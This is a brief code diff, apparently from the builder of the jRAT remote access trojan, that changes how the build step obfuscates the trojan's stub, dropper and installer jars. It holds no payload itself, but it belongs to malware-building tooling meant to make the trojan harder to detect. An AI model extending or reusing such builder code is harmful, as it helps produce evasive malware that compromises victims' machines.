@@ -223,9 +223,9 @@ public class Build {
 			
 			if (obfuscate) {
 				if (dropper) {
-					ZkmUtils.obfuscate(output, tempStubCleanJar);
+					ZkmUtils.obfuscateAtBuild(output, tempStubCleanJar, listener);
 				} else {
-					ZkmUtils.obfuscate(output, file);
+					ZkmUtils.obfuscateAtBuild(output, file, listener);
 				}
 			}
 
@@ -236,7 +236,7 @@ public class Build {
 
 				if (obfuscate) {
 					File temp = File.createTempFile("jrat-build-temp-obfuscated-installer", ".jar");
-					ZkmUtils.obfuscate(Files.getInstaller(), temp);
+					ZkmUtils.obfuscateAtBuild(Files.getInstaller(), temp, listener);
 					inputStub = new ZipFile(temp);
 				} else {
 					inputStub = new ZipFile(Files.getInstaller());
